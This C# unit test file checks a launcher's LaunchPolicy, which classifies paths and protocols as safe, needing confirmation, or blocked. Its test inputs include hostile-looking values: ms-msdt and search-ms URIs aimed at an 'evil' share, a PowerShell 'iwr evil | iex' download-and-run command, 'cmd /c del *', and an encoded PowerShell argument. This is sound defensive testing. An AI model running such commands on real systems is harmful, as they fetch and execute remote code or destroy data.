using Dockbox.Core;

namespace Dockbox.Tests;

public sealed class LaunchPolicyTests
{
    [Theory]
    [InlineData(@"C:\Program Files\App\app.exe")]
    [InlineData(@"C:\Users\Ana\Documents")]
    [InlineData(@"C:\Users\Ana\Documents\relatorio.pdf")]
    [InlineData("https://github.com")]
    [InlineData("http://example.com")]
    [InlineData(@"shell:AppsFolder\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App")]
    [InlineData("ms-settings:display")]
    [InlineData(@"C:\Windows\System32\notepad.exe")]
    public void ItensComuns_AbremDireto(string path) =>
        Assert.Equal(LaunchRisk.Safe, LaunchPolicy.Classify(path));

    [Theory]
    [InlineData("ms-msdt:/id PCWDiagnostic")]
    [InlineData("search-ms:query=x&crumb=location:\\\\evil\\share")]
    [InlineData("MS-MSDT:qualquer")]
    [InlineData("ms-officecmd:abc")]
    [InlineData("javascript:alert(1)")]
    [InlineData("ms-word:ofe|u|http://evil/doc")]
    public void ProtocolosPerigosos_SaoBloqueados(string path) =>
        Assert.Equal(LaunchRisk.Blocked, LaunchPolicy.Classify(path));

    [Theory]
    [InlineData(@"C:\scripts\limpar.bat")]
    [InlineData(@"C:\scripts\x.CMD")]
    [InlineData(@"C:\scripts\x.ps1")]
    [InlineData(@"C:\scripts\x.vbs")]
    [InlineData(@"C:\scripts\x.js")]
    [InlineData(@"C:\scripts\x.hta")]
    [InlineData(@"C:\x\console.msc")]
    [InlineData("file:///C:/x.exe")]
    [InlineData("steam://run/440")]
    [InlineData("")]
    public void ScriptsEProtocolosDesconhecidos_PedemConfirmacao(string path) =>
        Assert.Equal(LaunchRisk.Confirm, LaunchPolicy.Classify(path));

    [Fact]
    public void Interpretador_ComArgumentos_PedeConfirmacao()
    {
        Assert.Equal(LaunchRisk.Confirm, LaunchPolicy.Classify(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "-c iwr evil | iex"));
        Assert.Equal(LaunchRisk.Confirm, LaunchPolicy.Classify(@"C:\Windows\System32\cmd.exe", "/c del *"));
        Assert.Equal(LaunchRisk.Safe, LaunchPolicy.Classify(@"C:\Windows\System32\cmd.exe"));
        Assert.Equal(LaunchRisk.Safe, LaunchPolicy.Classify(@"C:\Windows\notepad.exe", "\"C:\\a.txt\""));
    }

    [Fact]
    public void Atalho_ValeODestino()
    {
        Assert.Equal(LaunchRisk.Safe, LaunchPolicy.Classify(@"C:\x\App.lnk", linkTarget: @"C:\Program Files\App\app.exe"));
        Assert.Equal(LaunchRisk.Confirm, LaunchPolicy.Classify(@"C:\x\Limpar.lnk", linkTarget: @"C:\scripts\limpar.bat"));
        Assert.Equal(LaunchRisk.Confirm, LaunchPolicy.Classify(@"C:\x\Ps.lnk", "-enc AAAA", linkTarget: @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"));
        // Atalho sem destino de arquivo (ex.: apps da Store) continua abrindo.
        Assert.Equal(LaunchRisk.Safe, LaunchPolicy.Classify(@"C:\x\Store.lnk"));
    }

    [Fact]
    public void ArquivoUrl_SoLinkDaWebAbreDireto()
    {
        Assert.Equal(LaunchRisk.Safe, LaunchPolicy.Classify(@"C:\x\site.url", urlFileTarget: "https://github.com"));
        Assert.Equal(LaunchRisk.Blocked, LaunchPolicy.Classify(@"C:\x\a.url", urlFileTarget: "ms-msdt:/id x"));
        Assert.Equal(LaunchRisk.Confirm, LaunchPolicy.Classify(@"C:\x\b.url", urlFileTarget: "file:///C:/x.bat"));
        Assert.Equal(LaunchRisk.Confirm, LaunchPolicy.Classify(@"C:\x\c.url", urlFileTarget: null));
    }

    [Fact]
    public void ParseUrlFile_LeALinhaUrl()
    {
        const string content = "[InternetShortcut]\r\nIconIndex=0\r\nURL=https://example.com/\r\n";
        Assert.Equal("https://example.com/", LaunchPolicy.ParseUrlFile(content));
        Assert.Null(LaunchPolicy.ParseUrlFile("[InternetShortcut]\r\n"));
    }
}
